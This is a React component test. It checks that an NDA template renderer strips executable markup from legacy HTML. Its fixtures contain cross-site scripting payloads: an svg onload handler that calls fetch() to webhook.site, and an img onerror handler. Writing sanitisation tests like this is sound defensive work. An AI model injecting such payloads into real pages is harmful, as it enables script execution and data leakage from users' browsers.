import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import NdaTemplateContent from "./NdaTemplateContent";

describe("NdaTemplateContent", () => {
  it("removes executable markup before rendering legacy HTML templates", () => {
    const { container } = render(
      <NdaTemplateContent
        template={{
          preamble:
            "<svg onload=\"fetch('https://webhook.site/x')\"></svg><p>Welcome</p>",
          body: '<img src="x" onerror="alert(1)"><p>Agreement</p>',
        }}
      />,
    );

    expect(screen.getByText("Welcome")).toBeInTheDocument();
    expect(screen.getByText("Agreement")).toBeInTheDocument();
    expect(container.querySelector("svg")).not.toBeInTheDocument();
    expect(container.querySelector("img")).not.toBeInTheDocument();
    expect(container.innerHTML).not.toContain("onload");
    expect(container.innerHTML).not.toContain("onerror");
    expect(container.innerHTML).not.toContain("webhook.site");
  });
});
